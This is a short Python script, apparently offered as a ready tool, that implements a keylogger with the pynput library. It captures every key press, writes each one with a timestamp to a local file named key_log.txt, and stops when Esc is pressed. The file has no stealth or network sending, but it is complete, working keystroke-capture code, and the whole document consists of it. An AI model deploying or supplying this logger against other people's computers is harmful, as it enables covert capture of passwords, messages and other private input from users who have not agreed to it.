from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

# Set up logging configuration to log keystrokes into a file
log_dir = ""  # Current directory
log_file = f"{log_dir}key_log.txt"

# Configure logging to write to the specified log file
logging.basicConfig(filename=log_file, 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

# Function to log each key press
def on_press(key):
    try:
        # If the key is a regular character, log it directly
        logging.info(str(key).replace("'", ""))
    except Exception as e:
        logging.error(f"Error logging key: {e}")

# Function to handle special key releases (optional: you can stop the keylogger with Esc)
def on_release(key):
    if key == Key.esc:
        # Stop the keylogger if Esc is pressed
        print("Keylogger stopped")
        return False

# Main function to start the listener for key presses
def main():
    print("Keylogger is running... Press 'Esc' to stop.")

    # Start listening to keyboard events
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
